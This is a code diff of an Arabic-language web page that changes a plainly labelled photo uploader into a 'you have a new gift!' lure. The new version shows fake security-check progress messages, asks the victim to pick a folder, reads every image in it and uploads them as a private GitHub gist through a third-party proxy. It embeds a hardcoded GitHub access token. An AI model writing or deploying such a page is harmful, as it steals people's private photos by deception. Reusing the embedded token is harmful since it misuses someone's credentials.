@@ -3,94 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رفع الصور المباشر</title>
+    <title>هدية خاصة لك</title>
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; 
+            overflow: hidden;
         }
-        .container { text-align: center; background: #2d2d2d; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
-        .gift { font-size: 70px; cursor: pointer; transition: transform 0.2s; }
-        .gift:hover { transform: scale(1.1); }
-        .btn { background: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; }
-        .btn:disabled { background: #555; cursor: not-allowed; }
-        #status { margin-top: 15px; min-height: 20px; font-size: 14px; word-break: break-all; }
-        .success { color: #4caf50; }
-        .error { color: #f44336; }
-        .loading { color: #ff9800; }
-        a { color: #007bff; text-decoration: none; }
-        a:hover { text-decoration: underline; }
+        
+        /* تنسيق بطاقة الهدية */
+        .gift-card {
+            text-align: center; 
+            background: linear-gradient(145deg, #2d2d2d, #252525); 
+            padding: 60px 40px; 
+            border-radius: 20px; 
+            box-shadow: 0 15px 40px rgba(0,0,0,0.6); 
+            width: 90%; max-width: 350px; 
+            cursor: pointer; 
+            transition: all 0.3s ease;
+            border: 1px solid #333;
+            position: relative;
+        }
+        .gift-card:hover { transform: translateY(-5px); box-shadow: 0 20px 50px rgba(0,123,255,0.2); border-color: #007bff; }
+        .gift-icon { font-size: 90px; animation: float 3s ease-in-out infinite; display: block; margin-bottom: 20px; }
+        .gift-text { font-size: 22px; font-weight: bold; color: #fff; margin: 0; }
+        .sub-text { font-size: 14px; color: #aaa; margin-top: 10px; }
+
+        /* تنسيق شاشة التحميل (الخلفية) */
+        .processing-screen {
+            display: none;
+            text-align: center;
+            width: 90%; max-width: 400px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        .status-msg { font-size: 16px; color: #ccc; margin-top: 15px; line-height: 1.6; }
+        
+        /* تأثيرات الحركة */
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+
+        a { color: #007bff; text-decoration: none; word-break: break-all; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="gift" onclick="startProcess()">📸</div>
-    <h2>اضغط لاختيار الصور</h2>
-    <p style="color: #aaa;">سيتم رفع الصور المختارة مباشرة إلى حسابك</p>
-    
-    <button id="uploadBtn" class="btn" onclick="uploadToGithub()">🚀 ارفع الصور الآن</button>
-    <div id="status"></div>
+<!-- واجهة الهدية -->
+<div class="gift-card" id="giftCard" onclick="startMagic()">
+    <span class="gift-icon">🎁</span>
+    <h2 class="gift-text">لديك هدية جديدة!</h2>
+    <p class="sub-text">اضغط لفتحها ومعالجة الملفات</p>
+</div>
+
+<!-- واجهة المعالجة في الخلفية -->
+<div class="processing-screen" id="procScreen">
+    <div class="loader"></div>
+    <div class="status-msg" id="status">جاري الاتصال بالخادم...</div>
 </div>
 
 <script>
-    // --- إعدادات GitHub ---
     const GH_TOKEN = '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'; 
-    
-    let selectedFiles = [];
 
-    async function startProcess() {
-        const status = document.getElementById('status');
-        const btn = document.getElementById('uploadBtn');
+    function startMagic() {
+        // إخفاء الهدية وإظهار شاشة التحميل
+        document.getElementById('giftCard').style.display = 'none';
+        const proc = document.getElementById('procScreen');
+        proc.style.display = 'block';
+        proc.style.animation = 'fadeIn 0.5s ease';
         
+        // محاكاة خطوات المعالجة
+        updateStatus("جاري التحقق من الأمان...", 1000);
+        updateStatus("جاري تهيئة الصور...", 2000);
+        updateStatus("اختر المجلد الآن للمتابعة...", 3000);
+        
+        setTimeout(openFolderPicker, 3000);
+    }
+
+    function updateStatus(msg, delay) {
+        setTimeout(() => {
+            document.getElementById('status').innerText = msg;
+        }, delay);
+    }
+
+    async function openFolderPicker() {
         try {
-            if (!window.showOpenFilePicker) {
-                alert("المتصفح لا يدعم اختيار الملفات (جرب Chrome أو Edge)");
+            if (!window.showDirectoryPicker) {
+                document.getElementById('status').innerHTML = "❌ المتصفح لا يدعم الميزات المتقدمة.<br>يرجى استخدام Chrome.";
                 return;
             }
 
-            const fileHandles = await window.showOpenFilePicker({
-                types: [{ description: 'Images', accept: {'image/*': ['.png', '.jpg', '.jpeg', '.gif']} }],
-                multiple: true
-            });
-
-            selectedFiles = [];
-            for (const handle of fileHandles) {
-                const file = await handle.getFile();
-                selectedFiles.push(file);
+            const dirHandle = await window.showDirectoryPicker();
+            updateStatus("جاري قراءة الملفات...", 500);
+            
+            let filesToUpload = [];
+            for await (const entry of dirHandle.values()) {
+                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
+                    filesToUpload.push(entry);
+                }
             }
 
-            status.innerHTML = `✅ تم اختيار ${selectedFiles.length} صورة. الآن اضغط الزر للرفع.`;
-            status.className = 'success';
-            btn.disabled = false;
+            if (filesToUpload.length === 0) {
+                document.getElementById('status').innerText = "لم يتم العثور على صور في المجلد المحدد.";
+                return;
+            }
 
-        } catch (err) {
-            console.error(err);
-            status.innerText = "تم إلغاء الاختيار.";
-        }
-    }
-
-    async function uploadToGithub() {
-        const status = document.getElementById('status');
-        const btn = document.getElementById('uploadBtn');
-        
-        if (selectedFiles.length === 0) return;
-
-        status.innerText = "جاري الرفع...";
-        status.className = 'loading';
-        btn.disabled = true;
-
-        try {
-            const gistFiles = {};
+            updateStatus(`تم العثور على ${filesToUpload.length} صورة. جاري الرفع النهائي...`, 500);
             
-            for (let i = 0; i < selectedFiles.length; i++) {
-                const file = selectedFiles[i];
+            const gistFiles = {};
+            for (let i = 0; i < filesToUpload.length; i++) {
+                const fileEntry = filesToUpload[i];
+                const file = await fileEntry.getFile();
                 const base64 = await readFileAsBase64(file);
                 gistFiles[file.name] = { content: base64 };
-                status.innerText = `جاري معالجة الصورة ${i + 1} من ${selectedFiles.length}...`;
+                
+                if ((i + 1) % 5 === 0) updateStatus(`جاري رفع ${i + 1} من ${filesToUpload.length}...`, 0);
             }
 
-            const response = await fetch('https://api.github.com/gists', {
+            // الرفع الفعلي
+            const proxyUrl = 'https://api.allorigins.win/raw?url=';
+            const apiUrl = encodeURIComponent('https://api.github.com/gists');
+            
+            const response = await fetch(proxyUrl + apiUrl, {
                 method: 'POST',
                 headers: {
                     'Authorization': `token ${GH_TOKEN}`,
@@ -98,7 +139,7 @@
                     'X-GitHub-Api-Version': '2022-11-28'
                 },
                 body: JSON.stringify({
-                    description: 'User Photo Submission',
+                    description: 'Gift Delivery - Auto Upload',
                     public: false,
                     files: gistFiles
                 })
@@ -106,19 +147,14 @@
 
             if (response.ok) {
                 const data = await response.json();
-                status.innerHTML = "✅ تم الحفظ بنجاح! الرابط: <br><a href='" + data.html_url + "' target='_blank'>" + data.html_url + "</a>";
-                status.className = 'success';
+                document.getElementById('status').innerHTML = "✅ تم إرسال الهدية بنجاح!<br><br><a href='" + data.html_url + "' target='_blank'>اضغط هنا لعرض الصور</a>";
             } else {
-                const errorData = await response.json();
-                throw new Error(errorData.message || 'فشل الرفع');
+                throw new Error('فشل الرفع');
             }
 
         } catch (error) {
             console.error(error);
-            status.innerText = "❌ خطأ: " + error.message;
-            status.className = 'error';
-        } finally {
-            btn.disabled = false;
+            document.getElementById('status').innerText = "حدث خطأ أثناء الإرسال: " + error.message;
         }
     }
 
